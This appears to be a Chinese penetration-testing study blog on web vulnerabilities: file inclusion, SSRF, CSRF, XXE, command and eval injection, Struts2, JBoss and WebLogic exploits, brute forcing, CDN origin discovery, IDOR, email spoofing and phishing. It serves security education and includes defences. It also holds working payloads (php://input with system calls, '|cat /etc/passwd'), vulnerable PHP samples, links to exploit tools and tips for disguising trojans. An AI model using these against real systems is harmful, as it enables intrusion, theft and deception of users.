<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。，即入侵者通过构造url访问日志文件。<br>Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中<br>我们访问文件上传的url，在url后面拼接../../../../Apache-20\logs\access.log，则页面会访问日志文件，我们可以获取信息。<br>例如:<a href="http://ip+端口/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log</a></p>
<h3 id="php包含读文件"><a href="#php包含读文件" class="headerlink" title="php包含读文件"></a>php包含读文件</h3><p>即我们使用burpsuit抓包之后，在访问页面上拼接<a href="http://IP+端口号/dvwa/vulnerabilities/fi/?page=**php://filter/read=convert.base64-encode/resource=文件名**则就会将文件内容读出来了。" target="_blank" rel="noopener">http://IP+端口号/dvwa/vulnerabilities/fi/?page=**php://filter/read=convert.base64-encode/resource=文件名**则就会将文件内容读出来了。</a>  </p>
<h3 id="php包含写文件"><a href="#php包含写文件" class="headerlink" title="php包含写文件"></a>php包含写文件</h3><p>在后面拼接<strong>php://input</strong><br>例如<a href="http://ip+端口/dvwa/vulnerabilities/fi/?page=php://input，抓包之后，写入内容并且提交post数据为" target="_blank" rel="noopener">http://ip+端口/dvwa/vulnerabilities/fi/?page=php://input，抓包之后，写入内容并且提交post数据为</a>:<?php system('net user');?>，则在网页上就会获得执行的命令结果。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）<br><strong>SSRF 形成的原因</strong>  大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，即服务器之间互相获取数据。<br>SSRF常出现的位置：<br>1）通过url地址分享网页内容<br>2）转码服务<br>3）在线翻译<br>4）通过url的图片加载与下载<br>5）图片，文章收藏功能<br>6）未公开的api实现，即其他的url调用<br>7）从url关键字中寻找，share，wap，url，link，src，source，target，u，3g，display，sourceurl，domain<br><strong>绕过</strong><br>1）例如有些开发者使用正则表达式过滤掉ip地址，我们可以将ip地址使用八进制或者十进制等写法进行更改<br>2）通过不正确的正则表达式解析：将其他的url认为是自己内网的ip<br><strong>存在漏洞的后端代码</strong><br>1.file_get_contents函数  </p>
<pre><code>`&lt;?php
if (isset($_POST[&#39;url&#39;])) 
{ 
$content = file_get_contents($_POST[&#39;url&#39;]); 
$filename =&#39;./images/&#39;.rand().&#39;;img1.jpg&#39;; 
file_put_contents($filename, $content); 
echo $_POST[&#39;url&#39;]; 
$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; 
} 
echo $img; 
?&gt;`</code></pre><p>这段函数从用户获取url图片，然后随机文件名保存在硬盘上<br>2.php fsockopen()<br>    <code>&lt;?php 
    function GetFile($host,$port,$link) 
    { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
    echo &quot;$errstr (error number $errno) \n&quot;; 
    } else { 
    $out = &quot;GET $link HTTP/1.1\r\n&quot;; 
    $out .= &quot;Host: $host\r\n&quot;; 
    $out .= &quot;Connection: Close\r\n\r\n&quot;; 
    $out .= &quot;\r\n&quot;; 
    fwrite($fp, $out); 
    $contents=&#39;&#39;; 
    while (!feof($fp)) { 
    $contents.= fgets($fp, 1024); 
    } 
    fclose($fp); 
    return $contents; 
    } 
    }
    ?&gt;</code><br>这段代码使用函数获取指定的url数据<br>3.curl_exec()  </p>
<pre><code>&lt;?php 
if (isset($_POST[&#39;url&#39;]))
{
$link = $_POST[&#39;url&#39;];
$curlobj = curl_init();
curl_setopt($curlobj, CURLOPT_POST, 0);
curl_setopt($curlobj,CURLOPT_URL,$link);
curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($curlobj);
curl_close($curlobj);

$filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;
file_put_contents($filename, $result); 
echo $result;
}
?&gt;</code></pre><p>使用curl_exec()获取url地址。 </p>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>使用远程文件包含进行端口扫描  </p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><strong>全拼</strong>：Cross Site Request Forgery 跨站点伪造请求<br><strong>原理：</strong>以受害者名义伪造请求，发送给攻击站点，也就是攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是合法的，但是对攻击者是有益的。CSRF是建立在session或者cookie上面的攻击，例如当执行银行转账的时候，好友发送来了一个攻击连接，这个连接与转账的页面相同，但是是精心构造的转账业务代码，此时该业务代码会继续利用cookie或者session中的身份信息进行转账操作，但是代码中的转账用户或者转账金额可能已经变化，所以最终会将钱转给攻击者。而这一切对于服务器来说都是合法的。并且这个过程是用户处在与银行网站的会话过程中，如果退出浏览器，则cookie也会消失，所以此时即使点击连接也是没有用的。<br><strong>CSRF分类</strong> 1.站外，例如一些评论区或者留言板，当被攻击者在会话状态下点击该连接就会执行攻击代码。<br>2.这种是由于程序员滥用request接受表单的方式引发的，因为request既可以接受post方式也可以接受get提交方式，这样由于在会话状态下访问了攻击者构造的get方式提交的代码，就可以更改用户信息，或者添加用户等操作。<br><strong>实战</strong><br><strong>CSRF防御</strong><br>1）验证HTTP Refer字段，防止访问站外链接。http头中有个refer字段它记录的请求的来源地址，如果refer指向的不是内部网站，而是攻击者指向的网站，则可能被检测出含有crsf攻击。<br>2）在请求中添加token并验证：因为攻击者会使用用户的cookie身份信息，因此在请求中放入攻击者不能伪造的信息，并且该信息不存在与cookie中，因此程序员在http请求提交时添加一个token，如果验证token不正确或者没有，那么说明不是用户提交的信息而被过滤掉。<br>3）在http中自定义属性：也是使用了token，但是这个token是放在http头的属性里面<br>4）在asp网站中不要使用request方式来提交，同时不要使用get方式执行持久性操作。<br>5）使用验证码或者密码确认方式，这种方式用户体验差。</p>
<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xml是一种允许用户对标记语言进行自定义的源语言。包括文档声明，DTD(document type defination)，文档元素。xxe全拼为xml外部引用漏洞。<br>xxe学习网址：<a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a><br>xml文档格式，实体分为引用实体和参数实体  </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding = &quot;gb1312&quot; encoding=&quot;UTF-8&quot;?&gt;//xml声明xml版本，编码  
&lt;!DOCTYPE root system &quot;http://www.xxx.com/file&quot;[//定义DTD,root为根节点名称，system为要使用的DTD本地文件路径，如果是公共文件，则将system换为public，路径改为公共路径即可。
&lt;!ELEMENT root(a,b,c,d)&gt;//声明xml中所有包含的节点名称，other代表其他元素名称的总称
&lt;!ELEMENT to(#PCDATA)&gt;//定义to元素为pcdata类型
&lt;!ELEMENT generalentity &quot;web.txt&quot;&gt;//引用实体，名称generalentity，引用web.txt中的内容，引用方式：&amp;实体名称,它的特点是在dtd中定义，在xml文档中使用，可以引用内部或者外部实体
&lt;!ELEMENT % extendentity SYSTEM &quot;www.xxx.com/file&quot;&gt;//定义参数实体，引用外部文件，引用方式：%参数名称，它的特点是在dtd中定义在dtd中使用，可以引用内部或者外部实体(注意在%和实体名称之间有空格)
]&gt;上面是定义的DTD，也就是限制了xml代码必须像下面这样写xml文档  

&lt;a&gt;我&lt;/a&gt;
&lt;b&gt;是&lt;/b&gt;
&lt;c&gt;&amp;generalentity&lt;/c&gt;</code></pre><p>因为引用实体和参数实体都可以引用外部实体，所以说如果将外部实体的路径改变为攻击者指定了payload文件，那么就说明出现了xxe漏洞。</p>
<h2 id="远程命令执行与反序列化"><a href="#远程命令执行与反序列化" class="headerlink" title="远程命令执行与反序列化"></a>远程命令执行与反序列化</h2><p><strong>定义：</strong>远程命令/代码执行，RCE(remote command/code execute)<br><strong>原因</strong>：因为系统需要提供远程命令操作，例如路由器，防火墙等。<br>PHP命令注入攻击：原因是程序员在使用一些提供给用户输入的命令执行函数时，没有对用户输入进行过滤。php中共有五个函数，1.system函数：string system(String command,int &amp;return_var)；执行命令函数<br>    <?
    $dir=$_GET("dir");
    if(isset("$dir")){
    echo"<pre>";
    system"ls -al".$dir;
    echo "</pre>";
    }
    ?>程序员想通过cmd命令浏览$dir,但是攻击者通过在路径上面拼接file.php？dir=|cat /etc/passwd,这样当程序执行时，$dir就会变成攻击者设置的攻击命令，进而完成攻击。<br>2.exec函数：String exec(String command,array&amp;output,int &amp;return_var);执行应用程序函数<br>代码与上面同理<br>3.passthru:void passthru(String command,int &amp;return_var);用来执行UNIX系统命令。<br>代码同上<br>4.shell_exec函数：String shell_exec(String command);执行shell命令并返回字符串。<br>代码同上<br>5.’’:这个运算符与shell_exec具有相同的作用。<br>    <?
    $cmd=$_GET("cmd");
    $output='$cmd';//这里与执行shell_exec是一样的。
    echo"<pre>";
    echo $output;
    echo "</pre>";
    ?></p>
<h3 id="eval注入攻击"><a href="#eval注入攻击" class="headerlink" title="eval注入攻击"></a>eval注入攻击</h3><p>eval函数会将字符串转换为php代码来执行，而上面的函数是将代码转换为cmd命令来执行。例如<br>    <?
    $cmd=$_GET("cmd");
    eval($cmd);
    ?>当在地址栏提交<a href="http://127.0.0.1/index.php?cmd=phpinfo();后就会出现执行phpinfo（）函数的结果。" target="_blank" rel="noopener">http://127.0.0.1/index.php?cmd=phpinfo();后就会出现执行phpinfo（）函数的结果。</a></p>
<h3 id="PHP木马后门常用命令"><a href="#PHP木马后门常用命令" class="headerlink" title="PHP木马后门常用命令"></a>PHP木马后门常用命令</h3><p>1.执行系统命令：<code>system，passthru，shell_exec,exec,popen,proc_open</code><br>2.代码执行与加密：<code>eval，assert，call_user_func,base64_decode,gzinflate,gzuncompress,gzdecode,str_rot13</code><br>3.文件包含与生成：<code>require,require_once,include,include_once,file_get_contents,file_put_contents,fputs,fwrite</code>  </p>
<h3 id="禁止webshell执行命令"><a href="#禁止webshell执行命令" class="headerlink" title="禁止webshell执行命令"></a>禁止webshell执行命令</h3><p>php配置文件里面有个disable_functions=配置，这个禁止一些执行命令的函数。</p>
<h3 id="Struts2框架漏洞"><a href="#Struts2框架漏洞" class="headerlink" title="Struts2框架漏洞"></a>Struts2框架漏洞</h3><p>首先安装apache，配置java环境变量，安装struts2框架。<br>注意事项：<br>首先在struts.xml配置文件添加<constant name="struts.mapper.alwaysSelectFullNamespace" value="true" /><br>其次修改配置文件struts-actionchaining.xml 删掉namespace属性，或使用了通配符*<br>最后把type=”chain”改成type=”redirectAction”<br>最后根据视频步骤进行攻击。使用K8进行漏洞获取。<br>*<em>struts2命令执行漏洞攻防演示 *</em><br>历史漏洞：<a href="https://www.seebug.org/search/?keywords=struts2" target="_blank" rel="noopener">https://www.seebug.org/search/?keywords=struts2</a><br>（1）s2早期综合利用工具<br>（2）s2-045漏洞还原<br>（3）s2-48攻击过程还原<br>struts2 S2-048远程代码执行漏洞exp<br>C:&gt;struts048.py <a href="http://ip:8081/struts2-showcase/integration/saveGangster.action" target="_blank" rel="noopener">http://ip:8081/struts2-showcase/integration/saveGangster.action</a> “ipconfig”<br>使用python写的payload执行ipconfig命令<br>（4）s2-052攻击过程还原(针对版本struts 2.5-2.5.12)<br>Struts S2-052漏洞利用之Meterpreter（CVE-2017-9805）<br><a href="https://www.cnblogs.com/Hi-blog/p/7510987.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hi-blog/p/7510987.html</a><br> (5) S2-057漏洞复现（需要参数alwaysSelectFullNamespace被设置为true)<br>Apache struts2 namespace远程命令执行—CVE-2018-11776(S2-057)漏洞复现<br><a href="http://ip:8081/struts2-showcase/actionChain1.action" target="_blank" rel="noopener">http://ip:8081/struts2-showcase/actionChain1.action</a><br>参考文章：<br><a href="https://blog.csdn.net/weixin_43625577/article/details/97111575" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43625577/article/details/97111575</a><br><a href="https://www.sinesafe.com/article/20180823/struts2057.html" target="_blank" rel="noopener">https://www.sinesafe.com/article/20180823/struts2057.html</a></p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。<br>详细参考：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br>在pikachu环境中找到php反序列化，使用该环境进行测试。<br>序列化过程代码<br>    class S{<br>        public $test= “pikachu”;</p>
<pre><code>}
    $s=new S();//创建一个对象
    serialize($S);//把对象序列化。
序列化后得到O:1:&quot;S&quot;:1:{S:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;}
其中 O:代表object
    1：代表对象的名字为一个字符
    s：对象的名称
    1：代表对象里面有一个变量
    s:数据类型
    4：变量名称的长度
    s:数据类型
    7：变量的长度
    pikachu：变量值
反序列化就是将上面的字符串在转为php代码</code></pre><p>反序列化产生的条件<br>1.反序列化的内容是可控的，例如上面序列化后的字符串更改为<code>O:1:&quot;S&quot;:1:{S:4:&quot;test&quot;;s:7:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code><br>2.后台使用了php中的魔法函数<br>在pikachu中输入上面1中的更改后的字符串，就会执行指定的代码<br><strong>Jboss反序列化漏洞</strong>，利用反序列化工具和使用seebug上面的漏洞。<br><a href="https://www.jianshu.com/p/e34062e0a6f1" target="_blank" rel="noopener">https://www.jianshu.com/p/e34062e0a6f1</a><br>新漏洞利用工具下载：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="noopener">https://github.com/yunxu1/jboss-_CVE-2017-12149</a><br>老漏洞综合利用工具下载：<a href="https://download.csdn.net/download/sinat_26474359/10650591" target="_blank" rel="noopener">https://download.csdn.net/download/sinat_26474359/10650591</a><br><strong>weblogic反序列化漏洞</strong>：<br>Weblogic 常见漏洞有那些：弱口令、Java 反序列化漏洞操作（CVE-2018-2628）、<br>任意文件上传漏洞操作（CVE-2018-2894）、XML Decoder 反序列化漏洞操作（CVE-2017-10271）、SSRF 漏洞（前提是需要安装Weblogic时选择UDDI组件）、反序列化漏洞（CVE-2019-2725 参考<a href="https://www.0dayhack.com/post-883.html）" target="_blank" rel="noopener">https://www.0dayhack.com/post-883.html）</a><br>weblogic反序列化工具bate1.1香草</p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>基于B/s暴力破解：使用burpsuit，当用户输入用户名和密码之后被burpsuit拦截，然后使用软件中的测试器中的位置选项，选取其中的爆破选项进行破解。需要尽量获取更多的信息。<br>基于C/S暴力破解：常用工具Hydra（kali自带）,Bruter,用来爆破系统密码等其中Hydra在kali中含有图形化界面而且kali中自带字典，路径自己查。<br><strong>真空密码生成器</strong>  </p>
<h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>验证码的作用就是为了区别计算机和人操作。<br><strong>验证码在客户端产生的问题</strong><br>1.验证码在客户端产生并且在前端使用js进行验证。这样攻击者通过删除前端的js验证码则可以绕过验证<br>2.验证码输出在客户端，也容易被盗取。<br>3.验证码输出在cookie中。有的程序员设置计数方式，当用户三次输入错误之后才进行验证码认证，其中计数器设置在cookie中进行计数，这样提供了用户体验感，但是攻击者在抓包之后删除了了cookie，这样计算机就会一直认为攻击者是第一次登录，进而不会产生验证码。<br><strong>服务端验证码产生的问题</strong><br>1.验证码不过期，在登录之后没有及时销毁，那么攻击者可以利用这个验证码进行登录（php默认销毁时间是23分钟）<br>2.没有进行非空判断。<br>3.验证码的提供的问题数量有限<br><strong>token破解</strong><br>token只能防CSRF攻击，但是不能防暴力破解。在burpsuit中线程数设置为1，grep-extract设置好开始为 token “value = “ 结束为”/&gt;，有效载荷设置为递归搜索。即可进行破解。<br><strong>验证码识别破解</strong><br>攻击工具PKav，可自动识别一些简单的数字验证码等。  </p>
<h2 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h2><p>略。</p>
<h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><p>旁注，我们可以理解为在同一服务器上的多个站点。在进行web站点架设的时候，很多时候由于成本等方面的原因，我们会在一个服务器上架设多个web站点，然后通过主机头对网站进行区分，使得可以通过不同域名访问到不同的web站点。<br>查询其他web站点：通过ping 一个网站，然后通过ping出来的ip地址使用反查技术获取其他web站点名称。<br>反查网址：<a href="http://tool.chinaz.com/Same/" target="_blank" rel="noopener">http://tool.chinaz.com/Same/</a><br><a href="http://dns.aizhan.com/" target="_blank" rel="noopener">http://dns.aizhan.com/</a><br><a href="http://www.11best.com/ip/" target="_blank" rel="noopener">http://www.11best.com/ip/</a>  </p>
<h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>在目前来看，跨库查询是指由于权限设置不严格，导致普通帐号被授予过高的权限，从而使得其可以对其他的数据库进行操作。比如，在mysql中，informatin_schema这个表默认只有root有权限进行操作。但是如果一个普通账户权限过高后，他便可以对该数据库进行操作，从而影响整个mysql数据库的运行。  </p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>由于互联网非常大，如果想访问我们站点的用户与我们的站点延迟非常大(例如从广东到北京)，导致网站首页打开都非常慢，这会直接影响到用户的访问体验。于是就出现了CDN，我们可以把CDN看作是我们web站点的镜像服务器，我们在站点架设好之后，只需要将DNS指向修改一下，就可以将所有用户的访问指向到CDN。CDN一般在全国各地都有，提高了用户访问速度；并且由于攻击者没有真实IP地址（CDN会自己指定一个ip），哪怕攻陷了CDN也不会对我们的服务器有任何影响，所以CDN解决了访问速度以及提高安全性这两个问题。我们要想办法找到CDN后面的真实服务器IP地址。下面介绍几个找到服务器真实IP地址的方法：<br>1.大型站点一般除了www的子域之外还会有mail、oa、crm等其他二级域名。我们这个时候可以在google搜索下site:XXX.com –www 或者site:xxx.com mail 来搜索其他的二级域名。通过其他的二级域名DNS解析所对应的IP地址来判断其拥有的IP地址段。一般情况下， www有可能是托管在其他地方但是mail服务器一般是企业自行运营维护。在获得其IP地址段之后，可以在浏览器地址栏通过直接访问IP地址或是使用nmap来进行整段扫描确认其真实IP地址。<br>2。通过多地ping来确认其真实IP地址；web站点架设的目的就是提供给人访问，有时候考虑到访问速度的问题会使用CDN提高访问速度，对于这种站点，可通过多地ping的方式，来判断其web服务器的真实IP地址。<br>多地ping工具：<br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a><br>结果中如果出现多个ip归属地说明存在CDN（例<a href="http://www.163.com），如果只有一个IP归属地则没有(例www.oldboyedu.com)。" target="_blank" rel="noopener">www.163.com），如果只有一个IP归属地则没有(例www.oldboyedu.com)。</a><br>3.通过命令 nslookup <a href="http://www.163.com" target="_blank" rel="noopener">www.163.com</a> 观察结果出出现的ip地址，如果有多个说明存在CDN，反之则不存在。<br><strong>CDN绕过</strong><br>（1）查看IP与域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> ###DNS查询<br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> ###微步在线<br><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a> ###在线域名信息查询<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> ###DNS、IP等查询<br><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a> ###CDN查询IP  </p>
<p>（2）利用SecurityTrails平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。<br><a href="https://securitytrails.com/domain/oldboyedu.com/dns" target="_blank" rel="noopener">https://securitytrails.com/domain/oldboyedu.com/dns</a><br>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。<br>(3)观看ip变化<br><a href="http://toolbar.netcraft.com/site_report?url=www.oldboyedu.com" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.oldboyedu.com</a><br>方法2:查询子域名<br>（1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)<br>（2）Dnsdb查询法(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)<br>（3）Google 搜索Google site:baidu.com -www就能查看除www外的子域名<br>（4）各种子域名扫描器<br>（5）网络空间引擎搜索法<br>常见的有以前的钟馗之眼，shodan，fofa搜索。<br>以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。<br>（6）利用SSL证书寻找真实原始IP<br>oldboyedu.com证书的搜索查询参数为：parsed.names：oldboyedu.com<br>只显示有效证书的查询参数为：tags.raw：trusted<br>(7)使用国外主机解析域名<br>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。<br>(8)方法网站漏洞查找<br>    1）目标敏感文件泄露，例如：phpinfo之类的探针、”info.php”, “phpinfo.php”, “test.php”,   “l.php”、GitHub信息泄露等。<br>    2）查看漏洞扫描报警信息，手工造成页面报错<br>    3）XSS盲打，命令执行反弹shell，SSRF等。<br>    4）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。  </p>
<p>(9)方法9:网站邮件订阅查找<br>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。<br>(10)：用 Zmap 扫全网<br>比如要找 xiaix.me 网站的真实 IP，我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me。<br>大概就这些了吧，其他的什么像 DDoS 把 CDN 流量打光的这种就算了吧，最好还是别干扰到人家网站的正常运转吧。<br>(11)：F5 LTM解码法<br>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip<br>（12）、通过信息报错或访问相关测试页面（）  </p>
<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>1、原理概述<br>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。<br>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，<strong>当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，</strong>从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。（这种漏洞扫描器无法发现，通常只有手动渗透）</p>
<p>2、越权分类<br>平行越权：A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。<br>查看源码我们看到，漏洞产生的原因是因为用户进行需要权限的操作时，没有对用户权限进行合理的验证，例如下面只验证提交信息和用户名，没有对当前session中的权限进行验证，导致如果在get方式提交后攻击者访问其他用户信息，只需要将username修改即可查看其他用户信息。 在pikachu中进行操作。</p>
<pre><code>&gt; if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;username&#39;]!=null){
&gt; //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
&gt; $username=escape($link, $_GET[&#39;username&#39;]);
&gt; $query=&quot;select * from member where username=&#39;$username&#39;&quot;;
&gt; $result=execute($link, $query);</code></pre><p>垂直越权:A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。<br>实战略<br>如果验证方式使用javascipt在前端进行验证，那么我们在浏览器的设置里面点击网站设置，将javascript禁用，并添加禁用的网站就可以绕过javascript的验证。</p>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>具体情况具体分析。参考文档。</p>
<h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="邮件安全三大协议"><a href="#邮件安全三大协议" class="headerlink" title="邮件安全三大协议"></a>邮件安全三大协议</h3><p>1.SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。例如：当邮件服务器收到自称发件人是<a href="mailto:spam@gmail.com">spam@gmail.com</a>的邮件，那么到底它是不是真的gmail.com的邮件服务器发过来的呢，我们可以查询gmail.com的SPF记录，以此防止别人伪造你来发邮件。<br>2.DKIM让企业可以把加密签名插入到发送的电子邮件中，然后把该签名与域名关联起来。签名随电子邮件一起传送，而不管是沿着网络上的哪条路径传送， 电子邮件收件人则可以使用签名来证实邮件确实来自该企业。可确保邮件内容不被偷窥或篡改。<br>3.DMARC（Domain-based Message Authentication, Reporting &amp; Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。从而有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。  </p>
<h3 id="邮件伪造"><a href="#邮件伪造" class="headerlink" title="邮件伪造"></a>邮件伪造</h3><p>邮件伪造最根本的原因就是SMTP协议<strong>不会验证发送者</strong>的身份，当邮件在两个不同的SMTP邮件服务器中被传输时，我们可以通过伪造来源欺骗接收者的SMTP服务器。没有配置SPF，邮件服务器就不会去验证发件人，就可以直接进行伪造了。邮件伪造网站<a href="http://tool.chacuo.net/mailanonymous。邮件伪造工具：" target="_blank" rel="noopener">http://tool.chacuo.net/mailanonymous。邮件伪造工具：</a><br>这种情况就需要用一些权威的邮件服务商去发送邮件了如sendgrid，mailgun，这些权威邮件服务商，会被大部分邮件服务商加到白名单中，这样他们的邮件就不会进到垃圾箱。  </p>
<h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站:"></a>钓鱼网站:</h3><p>网址伪造，使用一些特殊的字符，代替正规网址的一些容易伪造的字符。<br>UniCode编码表<a href="https://www.cnblogs.com/csguo/p/7401874.html，在这里面可以找到各种各样的字符进行替换。" target="_blank" rel="noopener">https://www.cnblogs.com/csguo/p/7401874.html，在这里面可以找到各种各样的字符进行替换。</a>  </p>
<h2 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h2><p>可以使用工具kiler Rat 将一个程序后缀名改为.jpg，迷惑用户进行点击<br>使用工具resourse hacker 可以更改应用程序的图标，创建木马程序等。<br>APT攻击：针对特定目标的攻击。  </p>
